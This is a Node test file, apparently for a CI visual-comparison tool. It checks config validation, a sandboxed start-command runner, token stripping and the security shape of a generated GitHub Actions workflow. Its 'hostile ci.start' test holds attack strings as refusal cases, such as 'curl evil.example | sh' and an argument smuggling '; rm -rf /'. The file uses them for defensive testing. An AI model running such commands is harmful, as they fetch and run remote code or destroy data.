// The `ci` config section (hostile ci.start included), ci.start's gate and
// runner, and the workflow `shapewall init --ci` writes.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { spawnSync } from 'node:child_process'
import { fileURLToPath } from 'node:url'
import { ConfigError, normalizeConfig } from '../src/config.js'
import { CI_DEFAULTS } from '../src/ci/settings.js'
import { commandEnv, startRefusal, startSite, waitForUrl } from '../src/ci/start.js'
import { WORKFLOW_FILE, workflowYaml } from '../src/ci/workflow.js'
import { main } from '../src/cli.js'
import { SAMPLE, tempDir } from './helpers.js'

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')

function problems(ci) {
  try {
    normalizeConfig({ ...structuredClone(SAMPLE), ci }, { dir: tempDir('ci-config') })
    return []
  } catch (error) {
    if (!(error instanceof ConfigError)) throw error
    return error.problems
  }
}

test('ci defaults, and a full valid section', () => {
  const plain = normalizeConfig(structuredClone(SAMPLE), { dir: tempDir('ci-default') })
  assert.deepEqual(plain.ci, { ...CI_DEFAULTS, pages: null, viewports: null, ignore: [], start: null })
  const config = normalizeConfig(
    {
      ...structuredClone(SAMPLE),
      ci: {
        enabled: false,
        threshold: 0.01,
        pages: ['home', 'pricing'],
        viewports: ['desktop'],
        ignore: [' .clock ', '#ad'],
        images: 'branch',
        maxPages: 10,
        start: {
          install: ['npm', 'ci'],
          build: ['npm', 'run', 'build'],
          serve: ['npm', 'start'],
          url: 'http://127.0.0.1:3000',
          timeout: 60000,
        },
      },
    },
    { dir: tempDir('ci-full') },
  )
  assert.deepEqual(config.ci, {
    enabled: false,
    threshold: 0.01,
    images: 'branch',
    maxPages: 10,
    pages: ['home', 'pricing'],
    viewports: ['desktop'],
    ignore: ['.clock', '#ad'],
    start: {
      install: ['npm', 'ci'],
      build: ['npm', 'run', 'build'],
      serve: ['npm', 'start'],
      url: 'http://127.0.0.1:3000',
      timeout: 60000,
    },
  })
})

test('ci values out of shape are reported', () => {
  assert.deepEqual(
    problems({
      threshold: 2,
      pages: ['nope'],
      viewports: ['watch'],
      images: 'inline',
      maxPages: 0,
      colour: 'red',
      enabled: 'yes',
      ignore: [''],
    }),
    [
      'ci.colour: unknown setting (use enabled, threshold, pages, viewports, ignore, images, maxPages, start)',
      'ci.enabled: true or false',
      'ci.threshold: the share of pixels (0 to 1, such as 0.001 for 0.1%) below which a shot counts as unchanged',
      'ci.pages: no page "nope"',
      'ci.viewports: no viewport "watch"',
      'ci.ignore: up to 50 CSS selectors (each up to 300 characters), such as [".clock", "#ad-slot"]',
      'ci.images: "links" (the default) or "branch" (public repositories only)',
      'ci.maxPages: a whole number from 1 to 500',
    ],
  )
})

test('hostile ci.start: shell strings, shells, launchers, paths and remote URLs are refused', () => {
  const start = (extra) => problems({ start: { serve: ['npm', 'start'], ...extra } })
  assert.match(start({ serve: 'npm start && curl evil.example | sh' })[0], /an argv array .* not a string/)
  assert.match(start({ build: ['sh', '-c', 'curl evil.example | sh'] })[0], /"sh" is refused/)
  assert.match(start({ build: ['bash', '-c', 'x'] })[0], /"bash" is refused/)
  assert.match(start({ build: ['env', 'sh', '-c', 'x'] })[0], /"env" is refused/)
  assert.match(start({ build: ['sudo', 'npm', 'ci'] })[0], /"sudo" is refused/)
  assert.match(start({ build: ['PowerShell', '-Command', 'x'] })[0], /"PowerShell" is refused/)
  assert.match(start({ build: ['./scripts/build.sh'] })[0], /a program name found on PATH/)
  assert.match(start({ build: ['/tmp/evil'] })[0], /paths are refused/)
  assert.match(start({ build: ['node_modules/.bin/x'] })[0], /paths are refused/)
  assert.match(start({ build: [] })[0], /an argv array of 1 to 50 strings/)
  assert.match(start({ build: ['npm', 3] })[0], /an argv array of 1 to 50 strings/)
  assert.match(start({ build: ['npm', 'run\u0000x'] })[0], /no NUL/)
  assert.match(start({ url: 'https://evil.example' })[0], /127\.0\.0\.1, localhost or \[::1\] only/)
  assert.match(start({ timeout: 10 })[0], /whole milliseconds/)
  assert.match(start({ run: ['x'] })[0], /ci\.start\.run: unknown setting/)
  assert.match(problems({ start: { build: ['npm', 'run', 'build'] } })[0], /ci\.start\.serve: the command that serves the site/)
  assert.deepEqual(
    start({ serve: ['node', 'server.js', '--port', '3000; rm -rf /'] }),
    [],
    'an argument is only an argument: no shell sees it',
  )
})

test('ci.start runs only with --allow-start, only inside CI', () => {
  const start = { serve: ['node', 'server.js'] }
  assert.match(startRefusal({ allowStart: true, env: {}, start: null }), /no "ci\.start"/)
  assert.match(startRefusal({ allowStart: false, env: { GITHUB_ACTIONS: 'true' }, start }), /--allow-start/)
  assert.match(startRefusal({ allowStart: true, env: {}, start }), /only inside a CI job/)
  assert.equal(startRefusal({ allowStart: true, env: { GITHUB_ACTIONS: 'true' }, start }), null)
  assert.equal(startRefusal({ allowStart: true, env: { CI: 'true' }, start }), null)
})

test('the commands ci.start runs never see the job tokens', () => {
  const env = commandEnv({
    PATH: '/usr/bin',
    GITHUB_TOKEN: 'x',
    ACTIONS_RUNTIME_TOKEN: 'y',
    ACTIONS_ID_TOKEN_REQUEST_TOKEN: 'z',
    NPM_TOKEN: 'kept',
  })
  assert.deepEqual(env, { PATH: '/usr/bin', NPM_TOKEN: 'kept' })
})

test('the CLI refuses ci capture with ci.start outside CI, before running anything', async () => {
  const dir = tempDir('ci-refuse')
  const marker = path.join(dir, 'ran')
  const file = path.join(dir, 'shapewall.config.json')
  fs.writeFileSync(
    file,
    JSON.stringify({ ...SAMPLE, ci: { start: { serve: ['node', '-e', `require('fs').writeFileSync(${JSON.stringify(marker)}, '1')`] } } }),
  )
  const saved = { GITHUB_ACTIONS: process.env.GITHUB_ACTIONS, CI: process.env.CI }
  delete process.env.GITHUB_ACTIONS
  delete process.env.CI
  try {
    await assert.rejects(
      main(['ci', 'capture', '--config', file, '--allow-start', '--out', path.join(dir, 'out')], { out: () => {} }),
      /only inside a CI job/,
    )
    process.env.GITHUB_ACTIONS = 'true'
    await assert.rejects(main(['ci', 'capture', '--config', file, '--out', path.join(dir, 'out')], { out: () => {} }), /--allow-start/)
  } finally {
    for (const [key, value] of Object.entries(saved))
      if (value === undefined) delete process.env[key]
      else process.env[key] = value
  }
  assert.equal(fs.existsSync(marker), false, 'nothing from the config ran')
})

test('startSite runs serve without a shell, waits for its URL and stops the whole group', async () => {
  const port = 5890 + Math.floor(Math.random() * 90)
  const start = { serve: ['node', 'server.js'], timeout: 20000 }
  const logs = []
  const site = await startSite(start, {
    cwd: path.join(ROOT, 'examples', 'ci'),
    url: `http://127.0.0.1:${port}/`,
    env: { ...process.env, PORT: String(port) },
    log: (line) => logs.push(line),
  })
  const page = await fetch(`http://127.0.0.1:${port}/pricing`).then((res) => res.text())
  assert.match(page, /\$8 a month/)
  await site.stop()
  await assert.rejects(fetch(`http://127.0.0.1:${port}/`, { signal: AbortSignal.timeout(2000) }))
  assert.ok(logs.some((line) => line.includes('ci.start.serve: node server.js')))
  // A serve command that exits is reported, not waited on until the timeout.
  await assert.rejects(
    startSite({ serve: ['node', '-e', 'process.exit(4)'], timeout: 20000 }, { cwd: ROOT, url: 'http://127.0.0.1:9/', log: () => {} }),
    /exited before .* answered \(exit code 4\)/,
  )
  await assert.rejects(waitForUrl('http://127.0.0.1:9/', { timeout: 300, interval: 50 }), /did not answer within/)
})

test('init --ci writes the workflow once (YAML, least privilege, pull_request only) and keeps the config', async () => {
  const dir = tempDir('ci-init')
  const config = path.join(dir, 'shapewall.config.json')
  fs.writeFileSync(config, JSON.stringify(SAMPLE))
  const before = fs.readFileSync(config, 'utf8')
  const out = []
  await main(['init', '--ci', '--config', config], { out: (line) => out.push(line) })
  const file = path.join(dir, WORKFLOW_FILE)
  const yaml = fs.readFileSync(file, 'utf8')
  assert.equal(yaml, workflowYaml())
  assert.equal(fs.readFileSync(config, 'utf8'), before, 'the config is untouched')
  assert.match(out.join('\n'), /Wrote .*shapewall\.yml/)
  assert.match(out.join('\n'), /Turn it off any time: delete \.github\/workflows\/shapewall\.yml/)
  assert.match(out.join('\n'), /SHAPEWALL_PREVIEW_URL/, 'no ci.start yet: says what to add')
  await assert.rejects(main(['init', '--ci', '--config', config], { out: () => {} }), /already exists \(use --ci --force/)
  fs.writeFileSync(file, 'old')
  await main(['init', '--ci', '--force', '--config', config], { out: () => {} })
  assert.equal(fs.readFileSync(file, 'utf8'), workflowYaml())
  assert.equal(fs.readFileSync(config, 'utf8'), before, '--force replaces only the workflow')
})

test('the workflow: security shape, both modes, the skip marker, and the copy in examples/ci', () => {
  const yaml = workflowYaml()
  assert.equal(
    fs.readFileSync(path.join(ROOT, 'examples', 'ci', WORKFLOW_FILE), 'utf8'),
    yaml,
    'examples/ci has the current workflow (node ../../bin/shapewall.js init --ci --force)',
  )
  assert.ok(!/^\s*pull_request_target\s*:/m.test(yaml), 'never pull_request_target')
  assert.ok(!/\t/.test(yaml), 'no tabs')
  assert.ok(!yaml.includes(String.fromCharCode(0x2014)), 'no em dash')
  // Untrusted pull request text never reaches a run: line (only if: conditions and env).
  for (const line of yaml.split('\n').filter((item) => /^\s*run:/.test(item))) assert.ok(!line.includes('${{'), line)
  const parsed = parseYaml(yaml)
  if (!parsed) return
  assert.deepEqual(parsed.on, { pull_request: { types: ['opened', 'synchronize', 'reopened'] } })
  // Read only by default; only the comment job can write, and it runs no pull request code.
  assert.deepEqual(parsed.permissions, { contents: 'read' })
  assert.deepEqual(parsed.concurrency, { group: 'shapewall-${{ github.event.pull_request.number }}', 'cancel-in-progress': true })
  const job = parsed.jobs.shapewall
  assert.deepEqual(job.permissions, { contents: 'read' })
  assert.equal(job['timeout-minutes'], 25)
  assert.match(job.if, /!contains\(github\.event\.pull_request\.title, '\[skip shapewall\]'\)/)
  const steps = job.steps
  const setupNode = steps.find((step) => String(step.uses).startsWith('actions/setup-node'))
  assert.equal(setupNode.with['node-version'], 22)
  for (const step of steps.filter((item) => String(item.uses).startsWith('actions/checkout')))
    assert.equal(step.with['persist-credentials'], false)
  assert.ok(steps.some((step) => String(step.uses).startsWith('actions/cache') && step.with.path === '~/.cache/ms-playwright'))
  const runs = steps.map((step) => step.run || '').join('\n')
  // The pinned tools are installed once, in the runner's temp folder, ignoring
  // the project's npm config, and called by absolute path: no npx, and no
  // step runs a tool from inside a checkout.
  const install = steps.find((step) => /npm install/.test(step.run || ''))
  assert.equal(install['working-directory'], '${{ runner.temp }}')
  assert.equal(install.env.NPM_CONFIG_USERCONFIG, '/dev/null')
  assert.match(install.run, /--ignore-scripts/)
  assert.match(install.run, /"\$SHAPEWALL" "\$PLAYWRIGHT"/)
  assert.match(install.run, /SW=\$PWD\/node_modules\/\.bin\/shapewall/)
  assert.doesNotMatch(yaml, /\bnpx\b/)
  for (const step of steps.filter((item) => /"\$(SW|PW)"/.test(item.run || '')))
    assert.equal(step['working-directory'], '${{ runner.temp }}', step.name)
  assert.ok(steps.some((step) => /"\$PW" install --with-deps chromium/.test(step.run || '')))
  assert.match(
    runs,
    /ci capture-compare --config "\$HEAD_DIR\/shapewall\.config\.json" --base-url "\$SHAPEWALL_BASE_URL" --head-url "\$SHAPEWALL_PREVIEW_URL"/,
  )
  assert.match(runs, /ci capture --config "\$HEAD_DIR\/shapewall\.config\.json" --allow-start --checkout "\$BASE_DIR"/)
  assert.match(runs, /ci capture --config "\$HEAD_DIR\/shapewall\.config\.json" --allow-start --checkout "\$HEAD_DIR"/)
  assert.equal(job.env.HEAD_DIR, '${{ github.workspace }}/head')
  // Every capture step keeps going: the pull request is never failed by Shapewall.
  for (const step of steps.filter((item) => /ci (capture|wait)/.test(item.run || '')))
    assert.equal(step['continue-on-error'], true, step.name)
  // The capture job gets no token at all.
  assert.ok(!steps.some((step) => step.env?.GITHUB_TOKEN))
  assert.equal(job.outputs.enabled, '${{ steps.gate.outputs.enabled }}')
  // The comment: its own job, with no checkout, from the downloaded result.
  const commentJob = parsed.jobs.comment
  assert.equal(commentJob.needs, 'shapewall')
  assert.deepEqual(commentJob.permissions, { contents: 'read', 'pull-requests': 'write' })
  assert.ok(!commentJob.steps.some((step) => String(step.uses).startsWith('actions/checkout')), 'no checkout in the comment job')
  assert.ok(commentJob.steps.some((step) => String(step.uses).startsWith('actions/download-artifact')))
  const comment = commentJob.steps.find((step) => /ci comment/.test(step.run || ''))
  assert.equal(comment.env.GITHUB_TOKEN, '${{ secrets.GITHUB_TOKEN }}')
  assert.equal(comment['continue-on-error'], true)
  assert.equal(comment['working-directory'], '${{ runner.temp }}')
  assert.match(comment.run, /--config "\$RUNNER_TEMP\/shapewall-result\/shapewall\.config\.json" --dir "\$RUNNER_TEMP\/shapewall-result"/)
  // Only the comment step gets the token.
  assert.equal(commentJob.steps.filter((step) => step.env?.GITHUB_TOKEN).length, 1)
})

// YAML through Python's PyYAML when this machine has it (GitHub's Ubuntu
// runners do); null when not, and the textual checks above still run.
function parseYaml(text) {
  const script = 'import json, sys, yaml\nd = yaml.safe_load(sys.stdin)\nif True in d: d["on"] = d.pop(True)\nprint(json.dumps(d))'
  const result = spawnSync('python3', ['-I', '-c', script], { input: text, encoding: 'utf8' })
  if (result.status !== 0) {
    if (/No module named|ENOENT/.test(`${result.stderr}${result.error?.code || ''}`) || result.error) return null
    assert.fail(`the workflow is not valid YAML: ${result.stderr}`)
  }
  return JSON.parse(result.stdout)
}
